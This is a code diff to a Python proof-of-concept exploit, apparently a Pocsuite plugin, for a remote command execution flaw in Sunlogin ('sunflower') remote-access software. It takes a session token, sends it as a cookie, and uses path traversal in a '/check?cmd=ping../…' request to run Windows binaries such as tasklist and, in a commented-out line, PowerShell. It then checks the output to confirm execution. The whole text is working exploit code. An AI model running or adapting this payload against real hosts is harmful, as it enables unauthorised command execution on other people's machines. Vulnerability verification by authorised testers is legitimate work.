@@ -49,13 +49,14 @@ class sunflower_RCE_POC(POCBase):
         verify_string = json.loads(r.text).get('verify_string')
 
         if r.status_code == 200 and "verify_string" in r.text:
-            path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+Warin9_0"
+            #path = "/check?cmd=ping../../../../../../../../../windows/system32/WindowsPowerShell/v1.0/powershell.exe+echo+Warin9_0"
+            path = "/check?cmd=ping../../../../../../../../../windows/system32/tasklist"
             vul_url = urljoin(url, path)
             header = {
                 "Cookie": "{}".format("CID=" + verify_string)
             }
             r = requests.get(vul_url, headers=header, timeout=self.timeout, verify=False)
-            if "Warin9_0" in r.text:
+            if "PID" in r.text and "failed" not in r.text:
                 return vul_url, header
         return False
 
@@ -79,10 +80,11 @@ class sunflower_RCE_POC(POCBase):
             header = p[1]
             #print(header)
             r = requests.get(vul_url, headers=header, timeout=30, verify=False)
-            result['VerifyInfo'] = {}
-            #result['VerifyInfo']['URL'] = vul_url
-            #result['VerifyInfo']['Header'] = header
-            result['VerifyInfo']['RCE'] = r.text
+            if "PID" in r.text and "failed" not in r.text:
+                result['VerifyInfo'] = {}
+                #result['VerifyInfo']['URL'] = vul_url
+                #result['VerifyInfo']['Header'] = header
+                result['VerifyInfo']['RCE'] = r.text
 
         return self.parse_output(result)
 
